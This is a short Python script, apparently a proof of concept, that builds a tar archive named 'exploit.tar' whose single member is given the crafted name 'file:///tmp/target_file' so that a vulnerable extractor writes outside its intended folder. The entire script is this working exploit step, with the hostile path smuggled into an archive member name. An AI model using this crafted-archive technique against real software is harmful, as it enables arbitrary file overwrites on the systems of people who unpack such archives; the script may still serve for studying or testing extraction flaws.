#!/usr/bin/python

import tarfile
tar = tarfile.open('exploit.tar', 'w')
tar.add('input_file.txt', 'file:///tmp/target_file')
tar.close()
